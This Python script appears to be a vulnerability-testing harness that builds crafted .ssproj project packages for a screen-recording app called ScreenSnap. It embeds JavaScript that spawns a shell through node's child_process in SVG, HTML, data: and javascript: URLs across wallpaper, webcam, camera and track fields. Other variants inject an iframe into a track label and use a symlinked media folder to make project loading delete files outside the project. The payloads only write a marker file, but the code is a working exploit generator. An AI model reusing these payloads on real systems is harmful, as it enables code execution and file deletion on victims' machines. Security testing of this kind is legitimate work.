#!/usr/bin/env python3
"""Build deterministic .ssproj candidates for the macOS LaunchServices gate.

The script only writes the package.  It never evaluates the embedded JavaScript
or executes the marker command.  ``screen.mp4`` must already exist in the
output directory so the exact ScreenSnap load handler reaches renderer
hydration before a candidate sink is exercised.
"""

from __future__ import annotations

import argparse
import json
import pathlib
import shutil
import urllib.parse


MARKER_PATH = "/tmp/screensnap-ssproj-command-marker"


def js_payload(marker_token: str) -> str:
    command = (
        "umask 077; "
        f"printf '%s\\n' 'SCREENSNAP_SSProj_COMMAND={marker_token}' > {MARKER_PATH}; "
        f"/usr/bin/id >> {MARKER_PATH}"
    )
    # JSON quoting produces a valid JavaScript string literal too.
    command_literal = json.dumps(command)
    return (
        "(()=>{try{"
        "const cp=require('node:child_process');"
        f"cp.execFileSync('/bin/sh',['-c',{command_literal}]);"
        "}catch(e){}})()"
    )


def svg_payload(script: str) -> str:
    return (
        '<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32">'
        f"<script><![CDATA[{script}]]></script>"
        '<rect width="32" height="32" fill="#663399"/>'
        "</svg>"
    )


def html_payload(script: str) -> str:
    return f"<!doctype html><meta charset=utf-8><script>{script}</script><p>candidate</p>"


def base_document() -> dict:
    return {
        "schemaVersion": 1,
        "source": {
            "screen": "screen.mp4",
            "camera": None,
            "cursor": None,
            "mic": None,
            "width": 320,
            "height": 180,
            "fps": 30,
            "durationMs": 2000,
            "webcamOffsetMs": 0,
            "micOffsetMs": 0,
            "cursorBakedIn": True,
        },
        "edit": {
            "lanes": {"video": [], "audio": []},
            "background": {},
            "webcam": {},
            "cursor": {},
            "zoomRegions": [],
            "blurRegions": [],
            "webcamScenes": [],
            "tracks": [],
        },
    }


def build(candidate: str, output: pathlib.Path, marker_token: str) -> dict:
    output.mkdir(parents=True, exist_ok=True)
    screen = output / "screen.mp4"
    if not screen.is_file() or screen.is_symlink() or screen.stat().st_size == 0:
        raise SystemExit(f"screen.mp4 must be a non-empty regular file: {screen}")

    script = js_payload(marker_token)
    svg = svg_payload(script)
    html = html_payload(script)
    doc = base_document()

    if candidate == "baseline":
        pass
    elif candidate == "wallpaper-data-svg":
        doc["edit"]["background"] = {
            "bgType": "wallpaper",
            "wallpaperUrl": "data:image/svg+xml," + urllib.parse.quote(svg, safe=""),
        }
    elif candidate == "wallpaper-file-svg":
        payload = output / "payload.svg"
        payload.write_text(svg, encoding="utf-8")
        doc["edit"]["background"] = {
            "bgType": "wallpaper",
            "wallpaperUrl": payload.resolve().as_uri(),
        }
    elif candidate == "wallpaper-data-html":
        doc["edit"]["background"] = {
            "bgType": "wallpaper",
            "wallpaperUrl": "data:text/html," + urllib.parse.quote(html, safe=""),
        }
    elif candidate == "webcam-data-html":
        doc["edit"]["webcam"] = {
            "enabled": True,
            "sourceUrl": "data:text/html," + urllib.parse.quote(html, safe=""),
        }
    elif candidate == "camera-file-html":
        (output / "payload.html").write_text(html, encoding="utf-8")
        doc["source"]["camera"] = "payload.html"
    elif candidate == "track-file-html":
        (output / "payload.html").write_text(html, encoding="utf-8")
        doc["edit"]["tracks"] = [
            {
                "id": "candidate-track",
                "kind": "video",
                "media": "payload.html",
                "label": "candidate",
                "timelineStartMs": 0,
                "segments": [
                    {
                        "id": "candidate-segment",
                        "sourceInMs": 0,
                        "sourceOutMs": 1000,
                        "speed": 1,
                    }
                ],
            }
        ]
    elif candidate == "javascript-image-url":
        doc["edit"]["background"] = {
            "bgType": "wallpaper",
            "wallpaperUrl": "javascript:" + urllib.parse.quote(script, safe="(){}[],:;='"),
        }
    elif candidate == "combined-url-sinks":
        (output / "payload.html").write_text(html, encoding="utf-8")
        (output / "payload.svg").write_text(svg, encoding="utf-8")
        doc["source"]["camera"] = "payload.html"
        doc["edit"]["background"] = {
            "bgType": "wallpaper",
            "wallpaperUrl": (output / "payload.svg").resolve().as_uri(),
        }
        doc["edit"]["webcam"] = {
            "enabled": True,
            "sourceUrl": "data:text/html," + urllib.parse.quote(html, safe=""),
        }
        doc["edit"]["tracks"] = [
            {
                "id": "candidate-track",
                "kind": "video",
                "media": "payload.html",
                "label": "candidate",
                "timelineStartMs": 0,
                "segments": [
                    {
                        "id": "candidate-segment",
                        "sourceInMs": 0,
                        "sourceOutMs": 1000,
                        "speed": 1,
                    }
                ],
            }
        ]
    elif candidate == "remote-renderer-sinks":
        # The workflow starts this loopback origin before its single open.  The
        # server records Sec-Fetch-Dest and serves script-bearing SVG/HTML.
        # Requests prove automatic hydration; only the OS command marker can
        # turn the run into an ACE PASS.
        base = "http://127.0.0.1:18765"
        doc["edit"]["background"] = {
            "bgType": "wallpaper",
            "wallpaperUrl": f"{base}/payload.svg",
        }
        doc["edit"]["webcam"] = {
            "enabled": True,
            "sourceUrl": f"{base}/payload.html",
            "offsetMs": 0,
        }
        doc["edit"]["tracks"] = [
            {
                "id": "remote-label-track",
                "kind": "video",
                "media": "screen.mp4",
                "label": f'<iframe src="{base}/EXECUTED?via=track-label"></iframe>',
                "timelineStartMs": 0,
                "segments": [
                    {
                        "id": "remote-label-segment",
                        "sourceInMs": 0,
                        "sourceOutMs": 1000,
                        "speed": 1,
                    }
                ],
            }
        ]
    elif candidate == "media-symlink-delete":
        # Exact `video-editor:load-project` enumerates project/media without an
        # lstat/realpath containment check and unlinks every unreferenced entry.
        # Keep the target inside the ephemeral workflow workspace; this proves
        # the ScreenSnap-owned automatic primitive without touching real user
        # data and cannot itself create a command marker.
        outside = output.parent / "outside-delete-target"
        outside.mkdir(parents=True, exist_ok=True)
        (outside / "delete-me.txt").write_text("DELETE_WITNESS\n", encoding="utf-8")
        shutil.copyfile(screen, outside / "preserve-me.mp4")
        (outside / "nested-directory").mkdir(exist_ok=True)
        (outside / "nested-directory" / "nested-witness.txt").write_text(
            "NESTED_DIRECTORY_SURVIVES_UNLINK\n", encoding="utf-8"
        )
        (output / "media").symlink_to("../outside-delete-target", target_is_directory=True)
        doc["edit"]["tracks"] = [
            {
                "id": "preserve-basename-track",
                "kind": "video",
                "media": "media/preserve-me.mp4",
                "label": "preserved external basename",
                "timelineStartMs": 0,
                "segments": [
                    {
                        "id": "preserve-basename-segment",
                        "sourceInMs": 0,
                        "sourceOutMs": 1000,
                        "speed": 1,
                    }
                ],
            }
        ]
    else:
        raise SystemExit(f"unknown candidate: {candidate}")

    project_json = output / "project.json"
    project_json.write_text(json.dumps(doc, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    manifest = {
        "candidate": candidate,
        "markerPath": MARKER_PATH,
        "markerToken": marker_token,
        "projectPath": str(output.resolve()),
        "projectJson": str(project_json.resolve()),
        "files": sorted(p.name for p in output.iterdir()),
    }
    (output / "candidate-manifest.json").write_text(
        json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return manifest


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--candidate", required=True)
    parser.add_argument("--output", type=pathlib.Path, required=True)
    parser.add_argument("--marker-token", required=True)
    args = parser.parse_args()
    print(json.dumps(build(args.candidate, args.output, args.marker_token), indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
